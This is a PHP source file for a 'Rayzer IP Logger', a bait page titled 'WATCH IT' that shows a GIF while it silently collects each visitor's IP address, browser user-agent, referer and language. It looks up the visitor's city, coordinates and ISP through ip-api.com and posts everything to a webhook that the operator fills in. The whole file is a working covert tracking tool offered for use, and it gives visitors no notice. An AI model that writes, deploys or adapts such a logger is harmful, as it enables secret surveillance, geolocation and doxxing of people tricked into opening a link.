<?php
// /web/rayzer.php

// CONFIGURATION
$WEBHOOK_URL = "PUT YOUR WEBHOOK HERE";
$GIF_URL = "https://media.tenor.com/Po3vHMaLLqgAAAAC/ronaldo-osuruk.gif";

$ip = $_SERVER['REMOTE_ADDR'];
if (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
    $ip = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR'])[0];
}
$userAgent = $_SERVER['HTTP_USER_AGENT'] ?? "Yok";
$referer = $_SERVER['HTTP_REFERER'] ?? "Yok";
$lang = $_SERVER['HTTP_ACCEPT_LANGUAGE'] ?? "Yok";

$geo = @json_decode(file_get_contents("http://ip-api.com/json/$ip?fields=status,country,regionName,city,lat,lon,isp,org,query"), true);

$embed = [
    "username" => "Rayzer IP Logger",
    "embeds" => [
        [
            "title" => "New Log (PHP) 🔍",
            "color" => hexdec("2f3136"),
            "fields" => [
                ["name" => "IP", "value" => "`$ip`", "inline" => true],
                ["name" => "Location", "value" => ($geo['city'] ?? "?") . ", " . ($geo['regionName'] ?? "?") . ", " . ($geo['country'] ?? "?"), "inline" => true],
                ["name" => "Cords", "value" => ($geo['lat'] ?? "?") . ", " . ($geo['lon'] ?? "?"), "inline" => true],
                ["name" => "ISP", "value" => $geo['isp'] ?? "Bilinmiyor", "inline" => false],
                ["name" => "User-Agent", "value" => "```$userAgent```", "inline" => false],
                ["name" => "Referer", "value" => $referer, "inline" => false],
                ["name" => "Language", "value" => $lang, "inline" => true]
            ],
            "footer" => ["text" => "Rayzer Logger"],
            "timestamp" => date("c")
        ]
    ]
];

$ch = curl_init($WEBHOOK_URL);
curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($embed));
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_exec($ch);
curl_close($ch);
?>
<!DOCTYPE html>
<html>

<head>
    <title>WATCH IT</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
</head>

<body style="margin:0;background:black;display:flex;justify-content:center;align-items:center;height:100vh;">
    <img src="<?php echo $GIF_URL; ?>" style="max-width:100%;height:auto;" />
</body>

</html>